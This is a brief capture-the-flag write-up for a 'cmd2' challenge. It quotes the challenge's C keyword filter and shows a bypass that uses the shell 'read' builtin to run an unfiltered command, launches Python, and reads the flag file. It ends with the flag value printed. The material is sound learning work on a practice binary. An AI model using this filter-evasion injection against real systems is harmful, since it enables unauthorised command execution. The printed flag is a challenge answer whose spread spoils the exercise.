# CMD2

In contrast to cmd1, this time we have more strict filters for our input:

```C
int filter(char* cmd){
	int r=0;
	r += strstr(cmd, "=")!=0;
	r += strstr(cmd, "PATH")!=0;
	r += strstr(cmd, "export")!=0;
	r += strstr(cmd, "/")!=0;
	r += strstr(cmd, "`")!=0;
	r += strstr(cmd, "flag")!=0;
	return r;
}
```

since I don't have the PATH environment variable, I've been looking for some useful sh builtins
here: https://www.gnu.org/software/bash/manual/html_node/Bourne-Shell-Builtins.html

I ended up using the read builtin the following way:

```
./cmd2 "read line && \$line"
/usr/bin/python

# Inside the interpreter
with open('/home/cmd2/flag', 'r') as f:
	print(f.read())
```

```
>>> with open('/home/cmd2/flag', 'r') as f:
...     print(f.read())
... 
FuN_w1th_5h3ll_v4riabl3s_haha
```